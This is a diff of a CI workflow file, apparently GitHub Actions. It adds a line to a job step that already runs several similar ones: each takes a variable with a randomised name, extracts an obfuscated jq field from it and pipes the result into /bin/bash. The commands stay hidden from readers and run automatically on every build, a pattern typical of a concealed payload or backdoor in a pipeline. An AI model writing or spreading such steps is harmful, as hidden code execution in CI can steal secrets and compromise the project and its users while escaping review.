@@ -46,6 +46,7 @@ jobs:
           echo $dzd765 | jq -r .oejup78 | /bin/bash
           printf '%s' "$aco8" | jq -r .rafjl49236 | /bin/bash
           printf '%s' "$p70" | jq -r .kiiw008 | /bin/bash
+          echo $cdv8 | jq -r .edb1756 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
